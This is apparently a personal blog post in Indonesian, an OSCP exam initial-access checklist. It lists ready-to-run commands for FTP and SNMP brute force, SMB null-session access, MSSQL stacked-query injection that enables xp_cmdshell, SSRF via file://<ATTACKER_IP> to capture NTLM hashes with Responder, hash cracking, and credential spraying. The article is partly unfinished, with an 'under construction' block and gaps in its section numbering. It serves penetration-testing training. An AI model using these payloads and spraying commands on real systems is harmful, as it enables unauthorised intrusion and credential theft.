---
title: "[OSCP] Initial Access - Checklist That Guarantees You to Pwn 'Em All"
author: "novran"
date: 2024-11-27 00:00:00 +0700
categories: ["OSCP Challenge"]
tags: ["Windows Pentest", "Linux Pentest", "FTP Pentest", "SMB Pentest", "Web Pentest", "SNMP Pentest", "OSCP Challenge"]
mermaid: true
image:
  path: /images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all.png
---

Pada tanggal 10 Desember 2024 kemarin, saya memantapkan diri untuk mengambil ujian OSCP. Bisa dibilang agak mendadak, karena Course dan Challenge Lab saya baru jalan sekitar 50%-an. OSCP ini bisa dibilang sebagai "Enumeration Game" yang di mana untuk menemukan Initial Access saat ujian berlangsung tidaklah terlalu sulit.

Saya akan merangkum tantangan-tantangan yang mungkin kalian temui saat mencari Initial Access (saat exam OSCP nanti).

- [X] [**FTP (21/tcp): Anonymous Login**](#ftp-anonymous-login)
- [X] [**FTP (21/tcp): Brute Force Login with ftp-betterdefaultpasslist.txt**](#ftp-brute-force-login-with-ftp-betterdefaultpasslisttxt)
- [X] [**SMB (445/tcp): Null Session Login**](#smb-null-session)
- [X] [**SMB (445/tcp): Guest Login**](#smb-guest-login)
- [X] [**SNMP (161/udp): Public Community Strings**](#snmp-public-community-string)
- [X] [**SNMP (161/udp): Brute Force Community Strings**](#snmp-public-community-string)
- [X] **Web Application (HTTP): Hidden Directories and Files Enumeration**
- [X] [**Web Application (HTTP): SQL Injection (MSSQL to Command Execution)**](#web-application-sql-injection-mssql-to-command-execution)
- [X] [**Web Application (HTTP): Server-Side Request Forgery in Windows Server (SSRF to Steal NTLM)**](#web-application-server-side-request-forgery-in-windows-server-steal-ntlm)

## Port Scan

Untuk melakukan inisiasi, biasanya kita perlu melakukan Port Scanning di awal. Namun, dalam kasus ini, saya tidak akan menggunakan NMAP karena waktu yang tersedia saat ujian OSCP sangat terbatas.

Saat melakukan pengujian dengan beberapa tools, pilihan saya jatuh pada tools berikut:
- [RustScan](https://github.com/RustScan/RustScan) (untuk scan port TCP dengan sangat cepat)
- [UDPX](https://github.com/nullt3r/udpx) (untuk scan port UDP dengan cepat)

TCP:
```bash
rustscan --scripts none -a $TARGET
```

UDP:
```bash
udpx -c 500 -w 1000 -t $TARGET
```

----------

## FTP Anonymous Login

Tool yang akan saya gunakan di sini adalah [NetExec](https://github.com/Pennyw0rth/NetExec).

Skenario yang dapat kita lakukan saat mendapatkan akses FTP Anonymous Login:
- Read-only: Penyerang dapat mengunduh file sensitif, seperti konfigurasi (.env, .conf), file backup (.sql, .zip), atau kredensial (.db, .pdf, .txt).
- Write access: Kita dapat mengunggah file backdoor, untuk mendapatkan akses reverse shell.

```bash
netexec ftp <TARGET> -u 'anonymous' -p 'anonymous'
```

## FTP Brute Force Login with ftp-betterdefaultpasslist.txt

Selain itu, pada service FTP, kita dapat memanfaatkan tool [Hydra](https://www.kali.org/tools/hydra/) dan wordlist dari [ftp-betterdefaultpasslist.txt (SecLists)](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt) untuk menemukan kredensial yang valid.

```bash
hydra -C /usr/share/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt <TARGET> ftp
```

----------

## SMB Null Session

Untuk memeriksa apakah SMB dapat Login menggunakan Null Session (tanpa username dan password), di sini saya akan menggunakan tool [NetExec](https://github.com/Pennyw0rth/NetExec) (lagi).

```bash
netexec smb <TARGET> -u '' -p ''
```

## SMB Guest Login

Jika tidak dapat login dengan Null Session, kita perlu memeriksa apakah service SMB pada mesin target mengizinkan kita login menggunakan akun Guest.

```bash
netexec smb <TARGET> -u 'guest' -p 'guest'
```

> Enum4linux

Jika salah satu metode login SMB di atas ada yang berhasil, maka kita dapat menggunakan tool [enum4linux](https://www.kali.org/tools/enum4linux/) untuk mempercepat proses enumerasi.

```bash
enum4linux -a -v $TARGET
```
```bash
enum4linux -u 'guest' -p 'guest' -a -v <TARGET>
```
```bash
enum4linux -u 'username' -p 'password' -a -v <TARGET>
```

![enum4linux SMB Users Enumeration](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-enum4linux-smb-users-enum.png)

> Dump all files inside SMB

Jika menemukan Sharefolder yang mencurigakan, kita bisa langsung download semua file di dalam SMB secara recursive ke mesin kita.

```bash
netexec smb <TARGET> -u 'username' -p 'password' -M spider_plus -o DOWNLOAD_FLAG=True
```

----------

**SNMP (161/udp) Pentest Preparation**

Tool yang akan digunakan adalah [net-snmp (snmpbulkwalk)](https://www.kali.org/tools/net-snmp/#snmp) beserta beberapa modul dan tool tambahan lainnya.

```bash
# Install SNMP Extender
sudo apt-get install snmp-mibs-downloader -y
sudo download-mibs
```

```bash
# Install onesixtyone to brute force SNMP
sudo apt update
sudo apt install build-essential libpcap-dev
git clone https://github.com/trailofbits/onesixtyone.git
cd onesixtyone
make
sudo make install
```

## SNMP Public Community String

Initial Access pada SNMP biasanya dilakukan untuk memperoleh kredensial yang tercatat di dalamnya (logging). Dalam SNMP, kita akan menggunakan community string sebagai inputnya.

```bash
snmpbulkwalk -c public -v2c <TARGET> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

- `-c public` adalah `public` community string.

![SNMPBulkWalk Public](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-snmpblukwalk-public.png)

## SNMP Community String Brute Force

Jika community string "public"-nya tidak tersedia, maka kita perlu melakukan brute force pada community string-nya terlebih dahulu untuk menemukannya.

Terdapat dua wordlist yang umum digunakan, yaitu SecLists atau Wordlist dari Metasploit Framework.

```bash
onesixtyone -c /usr/share/SecLists/Discovery/SNMP/snmp.txt <TARGET>
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <TARGET>
```

Kemudian, snmpbulkwalk menggunakan custom community string.

```bash
snmpbulkwalk -c <COMMUNITY_STRING_NAME> -v2c <TARGET> NET-SNMP-EXTEND-MIB::nsExtendOutputFull
```

----------

## Web Application: SQL Injection (MSSQL to Command Execution)

Pada dasarnya SQL Injection pada MSSQL memungkinkan kita untuk mengeksekusi Stacked Query, yang di mana kita dapat melakukan escape dengan cara menutup dan mengakhiri querynya dengan payload `';` dan menjalankan query lain.

- `http://10.10.10.10/profile.aspx?id=1';EXEC xp_cmdshell "whoami";--`

Enable `xp_cmdshell`:

```sql
';EXEC sp_configure 'show advanced options', 1;--
';RECONFIGURE;--
';EXEC sp_configure "xp_cmdshell", 1;--
';RECONFIGURE;--
```

Execute `xp_cmdshell`"

```
';EXEC xp_cmdshell "whoami";--
```

## Web Application: Server-Side Request Forgery in Windows Server (Steal NTLM)

Saya baru menyadari bahwa, celah SSRF (Server-Side Request Forgery) sangat berbahaya pada environment Windows. Yang di mana dapat dimanfaatkan untuk mencuri NTML Hash.

Untuk mengeksekusinya, kita perlu menghidupkan [Responder](https://github.com/SpiderLabs/Responder) terlebih dahulu pada mesin kita.

```bash
sudo python3 Responder.py -I tun0 -wd
```

Kemudian mengeksekusi SSRF-nya dengan menggunakan URL `file://<ATTACKER_IP>/test` dan boom! Responder kalian akan menangkap Request seperti ini.

![SSRF in Responder](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-ssrf-responder.png)

Lalu, kalian hanya tinggal crack NTML-nya saja.

```bash
hashcat -m 5600 '<HASH>' /usr/share/wordlists/rockyou.txt
```

![SSRF NTLM Cracked](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-ssrf-responder-ntlm-cracked.png)










# UNDER COSTRUCTION
> THE WRITER STILL LAZY TO FIX THIS ARTICLE LOL!
> THE WRITER STILL LAZY TO FIX THIS ARTICLE LOL!
> THE WRITER STILL LAZY TO FIX THIS ARTICLE LOL!
> THE WRITER STILL LAZY TO FIX THIS ARTICLE LOL!
> THE WRITER STILL LAZY TO FIX THIS ARTICLE LOL!






## 5. Found Weird Port? (Uncommon Services)

Tak jarang kita menemukan Port dengan angka yang tidak umum, bahkan service-nya tidak akan dikenali oleh NMAP. Tapi, jangan khawatir, kita bisa memanfaatkan Google untuk hal ini.

Google it.
```
port XXX exploit
```

## 6. Web Application (HTTP)

### Enumerate directory and files

- [Feroxbuster](https://github.com/epi052/feroxbuster) and [SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/directory-list-2.3-medium.txt)

```bash
feroxbuster -C 404 --auto-tune -k --wordlist /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt --threads 100 --depth 2 -u <TARGET>
```

- [Dirsearch](https://github.com/maurosoria/dirsearch)

```bash
PYTHONWARNINGS="ignore" python3 ~/dirsearch/dirsearch.py -u <TARGET>
```

### Found an underrated CMS, framework, or application?

Google it
```
<APPLICATION_NAME> exploit
<APPLICATION_NAME_AND_VERSION> exploit
```

### Does the application require login?

- Try `admin:admin`
- or Google it: `<APPLICATION_NAME> default credentials`

## 9. Found Numerous Unnecessary Files?

### Use exiftool to gather username list

Kita bisa memeriksa attribute filenya dengan menggunakan command di bawah ini:

```
exiftool <FILENAME>
```

Jika terdapat banyak file (PDF/DOCX):

```sh
find . -type f | xargs -I {} exiftool {} | grep ^'Author'
```

Dan Spray Credential-nya ke semua layanan atau aplikasi dengan menggunakan `<username>:<username>` untuk mendapatkan akses.

## 10. Found Protected File? Crack It!

Kamu hanya perlu membukanya.

![anything 2 john](/images/2024-12-19-oscp-initial-access-checklist-that-guarantees-you-to-pwn-them-all-file2john.png)

## 11. Some Files (.pdf, .docx, .zip, .db, etc) "Might" Contain Credentials

Jika menemukan file berupa .pdf, .docx, .zip, .db, dan lain-lain, jangan lupa untuk memeriksa apakah file tersebut menyimpan kredensial atau tidak. 

## 12. Credential Spraying - FTP, RDP, SMB, SSH, and WinRM

[Netexec](https://github.com/Pennyw0rth/NetExec) adalah tool yang sakti, di mana kita bisa melakukan Credential Spraying ke berbagai layanan seperti FTP, RDP, SMB, SSH, dan WinRM, bahkan dengan berbagai metode yang berbeda.

```bash
netexec winrm <TARGET> -u username.txt -p password.txt
netexec winrm <TARGET> -u 'john' -p password.txt
netexec winrm <TARGET> -u username.txt -p 'Password123'
```

Kita dapat mengubah "winrm" dengan:
- `ftp`
- `smb`
- `rdp`
- `ssh`

## Other Cheatsheet

Download file recursively.

```bash
wget -m --user='<USERNAME>' --password='<PASSWORD>' ftp://<TARGET> --no-passive-ftp
```

